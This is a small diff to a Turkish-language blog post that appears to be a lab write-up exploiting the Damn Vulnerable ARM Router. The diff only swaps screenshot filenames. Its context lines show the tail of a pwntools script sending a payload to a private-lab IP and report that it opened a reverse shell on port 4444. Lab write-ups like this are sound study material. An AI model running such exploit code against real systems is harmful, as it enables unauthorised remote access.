@@ -179,9 +179,9 @@ conn = remote('192.168.227.128', 80)
 conn.send(b'GET /' + payload +"\r\n\r\n")
 {% endhighlight %}
 
-<img src="{{site.baseurl}}/pictures/dvar_25.png">
+<img src="{{site.baseurl}}/pictures/dvar_26.png">
 
-<img src="{{site.baseurl}}/pictures/dvar_25.png">
+<img src="{{site.baseurl}}/pictures/dvar_27.png">
 
 Exploit kod başarıyla çalıştı ve host makinemizde dinlemeye alıdığımız 4444 port'una  reverse shell bağlantısı gerçekleştirdi. Buraya kadar okuyanlara teşekkür ederim . Gelecek yazılarda görüşmek üzere :)
 
